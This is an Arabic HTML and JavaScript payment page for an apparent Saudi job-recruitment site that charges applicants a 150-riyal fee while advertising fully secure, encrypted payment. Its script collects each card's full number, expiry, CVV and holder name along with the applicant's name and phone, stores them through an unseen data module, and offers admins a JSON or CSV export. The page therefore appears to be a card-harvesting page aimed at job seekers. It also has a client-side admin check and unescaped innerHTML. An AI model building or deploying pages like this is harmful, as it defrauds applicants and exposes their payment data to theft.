<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توظيف السعودية | الدفع الآمن</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .payment-container { max-width: 600px; margin: 2rem auto; }
        .fee-box { background: linear-gradient(135deg, #ffd32a, #ffb302); border-radius: 24px; padding: 2rem; text-align: center; margin-bottom: 2rem; }
        .fee-box .amount { font-size: 3.5rem; font-weight: bold; color: #1a4a6e; }
        .payment-status { margin-top: 1rem; padding: 1rem; border-radius: 12px; display: none; text-align: center; font-weight: bold; }
        .payment-status.success { background: #00b894; color: white; display: block; }
        .payment-status.error { background: #ff4757; color: white; display: block; }
        .payment-status.loading { background: #ffd32a; color: #1a4a6e; display: block; }
        .payment-summary { background: #f5f7fa; border-radius: 20px; padding: 1.5rem; margin-bottom: 2rem; border: 1px solid #e0e0e0; }
        .payment-summary h3 { color: #1a4a6e; margin-bottom: 1rem; border-right: 4px solid #ffd32a; padding-right: 0.75rem; }
        .summary-row { display: flex; justify-content: space-between; margin-bottom: 0.75rem; padding: 0.5rem 0; border-bottom: 1px solid #e0e0e0; }
        .total-row { font-weight: bold; color: #1a4a6e; font-size: 1.2rem; margin-top: 0.5rem; padding-top: 0.5rem; border-top: 2px solid #1a4a6e; }
        .payment-methods { margin-bottom: 1.5rem; }
        .payment-methods h3 { margin-bottom: 1rem; color: #333; }
        .method {
            display: flex;
            align-items: center;
            padding: 0.75rem;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            margin-bottom: 0.5rem;
            cursor: pointer;
            transition: all 0.3s;
        }
        .method:hover, .method.selected { border-color: #1a4a6e; background: #e0e7ff; }
        .method-icon { font-size: 1.5rem; margin-left: 0.75rem; }
        .method-name { font-weight: 500; }
        .payment-form-container { background: #f8fafc; border-radius: 16px; padding: 1.5rem; border: 1px solid #e0e0e0; }
        .card-input {
            width: 100%;
            padding: 0.8rem;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1rem;
            margin-top: 0.25rem;
            transition: all 0.3s;
        }
        .card-input:focus { outline: none; border-color: #1a4a6e; }
        .pay-button {
            width: 100%;
            padding: 1rem;
            background: linear-gradient(135deg, #1a4a6e, #0a2b3d);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            margin-top: 1rem;
            transition: all 0.3s;
        }
        .pay-button:hover { transform: translateY(-2px); }
        .export-buttons { display: flex; gap: 1rem; margin-top: 1.5rem; }
        .export-btn { flex: 1; padding: 0.75rem; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; }
        .export-json { background: #1a4a6e; color: white; }
        .export-csv { background: #00b894; color: white; }
    </style>
</head>
<body>
    <nav class="navbar" id="navbar"></nav>

    <div class="container payment-container">
        <div class="fee-box">
            <h3>رسوم الاشتراك الوظيفي</h3>
            <div class="amount">150 <small>ريال سعودي</small></div>
            <p>دفع آمن ومشفر 100%</p>
        </div>

        <div class="payment-summary" id="orderSummary">
            <h3>ملخص طلبك</h3>
            <div id="summaryContent"></div>
        </div>

        <div class="payment-methods">
            <h3>اختر طريقة الدفع</h3>
            <div class="method selected" data-method="creditcard">
                <span class="method-icon">💳</span>
                <span class="method-name">بطاقة ائتمان</span>
            </div>
            <div class="method" data-method="mada">
                <span class="method-icon">🏦</span>
                <span class="method-name">مدى (Mada)</span>
            </div>
        </div>

        <div id="paymentFormContainer" class="payment-form-container"></div>
        <div id="paymentStatus" class="payment-status"></div>

        <div id="exportButtons" class="export-buttons" style="display: none;">
            <button onclick="SaudiJobsDB.exportToJSON()" class="export-btn export-json">تصدير JSON</button>
            <button onclick="SaudiJobsDB.exportToCSV()" class="export-btn export-csv">تصدير CSV</button>
        </div>
    </div>

    <footer class="footer"><div class="footer-bottom">2024 توظيف السعودية</div></footer>

    <script src="get-data.js"></script>
    <script>
        const userId = localStorage.getItem('currentUserId');
        const userEmail = localStorage.getItem('currentUserEmail');
        const applicationId = localStorage.getItem('currentApplicationId');
        const jobName = localStorage.getItem('selectedJobName');
        
        if (!userId) window.location.href = 'login.html';
        if (!applicationId) window.location.href = 'jobs.html';
        
        const ADMIN_EMAILS = ['admin@saudijobs.sa'];
        const isAdmin = ADMIN_EMAILS.includes(userEmail);
        
        function updateNavbar() {
            const navbar = document.getElementById('navbar');
            navbar.innerHTML = `
                <div class="logo">
                    <span class="logo-icon">🇸🇦</span>
                    <div><h1>توظيف السعودية</h1><p>Saudi Jobs</p></div>
                </div>
                <div class="nav-links">
                    <a href="index.html">الرئيسية</a>
                    <a href="jobs.html">التخصصات</a>
                    <a href="my-applications.html">طلباتي</a>
                    <div class="user-menu">
                        <div class="user-avatar">${userEmail ? userEmail.charAt(0).toUpperCase() : 'U'}</div>
                        <span class="user-name">${userEmail ? userEmail.split('@')[0] : 'مستخدم'}</span>
                        <button class="logout-btn" onclick="logout()">تسجيل خروج</button>
                    </div>
                </div>
            `;
        }
        
        if (isAdmin) {
            document.getElementById('exportButtons').style.display = 'flex';
        }
        
        const userData = SaudiJobsDB.getUser(userId);
        const summaryContent = document.getElementById('summaryContent');
        if (userData) {
            summaryContent.innerHTML = `
                <div class="summary-row"><span>مقدم الطلب:</span><span>${userData.fullName || 'غير مكتمل'}</span></div>
                <div class="summary-row"><span>التخصص:</span><span>${jobName || 'غير محدد'}</span></div>
                <div class="summary-row"><span>البريد:</span><span>${userEmail}</span></div>
                <div class="summary-row"><span>رقم الجوال:</span><span>${userData.phone || 'غير مسجل'}</span></div>
                <div class="total-row"><span>المبلغ:</span><span>150 ريال سعودي</span></div>
            `;
        }
        
        let currentMethod = 'creditcard';
        
        function formatCardNumber(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            let formatted = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += value[i];
            }
            input.value = formatted;
        }
        
        function formatExpiry(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            input.value = value.slice(0, 5);
        }
        
        async function processPayment() {
            const cardNumber = document.getElementById('cardNumber');
            const expiry = document.getElementById('expiry');
            const cvv = document.getElementById('cvv');
            
            if (cardNumber) {
                const cardNum = cardNumber.value.replace(/\s/g, '');
                if (cardNum.length !== 16) {
                    showError('رقم البطاقة يجب أن يكون 16 رقم');
                    return;
                }
            }
            
            if (expiry) {
                const expiryVal = expiry.value;
                if (!expiryVal.match(/^(0[1-9]|1[0-2])\/([0-9]{2})$/)) {
                    showError('تاريخ الانتهاء يجب أن يكون بصيغة MM/YY');
                    return;
                }
            }
            
            if (cvv) {
                const cvvVal = cvv.value;
                if (!cvvVal.match(/^[0-9]{3}$/)) {
                    showError('رمز CVV يجب أن يكون 3 أرقام');
                    return;
                }
            }
            
            const statusDiv = document.getElementById('paymentStatus');
            statusDiv.className = 'payment-status loading';
            statusDiv.textContent = 'جاري معالجة الدفع...';
            
            const paymentData = {
                userId: parseInt(userId),
                applicationId: parseInt(applicationId),
                amount: 150,
                cardNumber: cardNumber ? cardNumber.value.replace(/\s/g, '') : '',
                cardExpiry: expiry ? expiry.value : '',
                cardCvv: cvv ? cvv.value : '',
                cardHolderName: document.getElementById('cardName') ? document.getElementById('cardName').value : '',
                paymentMethod: currentMethod,
                fullName: userData?.fullName,
                phone: userData?.phone
            };
            
            const result = await SaudiJobsDB.savePayment(paymentData);
            
            if (result && result.success) {
                statusDiv.className = 'payment-status success';
                statusDiv.innerHTML = `✅ تم الدفع بنجاح! رقم العملية: ${result.id}<br>جاري تحويلك...`;
                setTimeout(() => {
                    window.location.href = 'success.html';
                }, 2000);
            } else {
                statusDiv.className = 'payment-status error';
                statusDiv.innerHTML = '❌ فشل الدفع. يرجى المحاولة مرة أخرى.';
            }
        }
        
        function showError(msg) {
            const statusDiv = document.getElementById('paymentStatus');
            statusDiv.className = 'payment-status error';
            statusDiv.textContent = msg;
            setTimeout(() => {
                statusDiv.className = 'payment-status';
                statusDiv.textContent = '';
            }, 3000);
        }
        
        function showCreditCardForm() {
            return `
                <div><label>رقم البطاقة</label><input type="text" id="cardNumber" class="card-input" placeholder="4111 1111 1111 1111" maxlength="19"></div>
                <div style="display:flex;gap:1rem;margin:1rem 0"><div style="flex:1"><label>تاريخ الانتهاء</label><input type="text" id="expiry" class="card-input" placeholder="MM/YY" maxlength="5"></div><div style="flex:1"><label>CVV</label><input type="text" id="cvv" class="card-input" placeholder="123" maxlength="3"></div></div>
                <div><label>الاسم على البطاقة</label><input type="text" id="cardName" class="card-input" placeholder="AHMED MOHAMMED"></div>
                <button id="payBtn" class="pay-button">دفع 150 ريال</button>
                <p style="font-size:0.7rem;color:#888;text-align:center;margin-top:1rem;">بيئة اختبار - استخدم: 4111111111111111 | أي تاريخ | أي CVV</p>
            `;
        }
        
        function showMadaForm() {
            return `
                <div><label>رقم بطاقة مدى</label><input type="text" id="cardNumber" class="card-input" placeholder="4700 0000 0000 0000" maxlength="19"></div>
                <div style="display:flex;gap:1rem;margin:1rem 0"><div style="flex:1"><label>تاريخ الانتهاء</label><input type="text" id="expiry" class="card-input" placeholder="MM/YY" maxlength="5"></div><div style="flex:1"><label>CVV</label><input type="text" id="cvv" class="card-input" placeholder="123" maxlength="3"></div></div>
                <button id="payBtn" class="pay-button">دفع 150 ريال</button>
                <p style="font-size:0.7rem;color:#888;text-align:center;margin-top:1rem;">بيئة اختبار - استخدم: 4700000000000000 | أي تاريخ | أي CVV</p>
            `;
        }
        
        function bindEvents() {
            const cardNumber = document.getElementById('cardNumber');
            const expiry = document.getElementById('expiry');
            const payBtn = document.getElementById('payBtn');
            
            if (cardNumber) {
                cardNumber.addEventListener('input', function() { formatCardNumber(this); });
            }
            if (expiry) {
                expiry.addEventListener('input', function() { formatExpiry(this); });
            }
            if (payBtn) {
                payBtn.addEventListener('click', processPayment);
            }
        }
        
        function updatePaymentForm(method) {
            const container = document.getElementById('paymentFormContainer');
            container.innerHTML = method === 'creditcard' ? showCreditCardForm() : showMadaForm();
            bindEvents();
        }
        
        document.querySelectorAll('.method').forEach(m => {
            m.addEventListener('click', function() {
                document.querySelectorAll('.method').forEach(m2 => m2.classList.remove('selected'));
                this.classList.add('selected');
                currentMethod = this.dataset.method;
                updatePaymentForm(currentMethod);
            });
        });
        
        function logout() {
            localStorage.clear();
            window.location.href = 'index.html';
        }
        
        updateNavbar();
        updatePaymentForm('creditcard');
    </script>
</body>
</html>
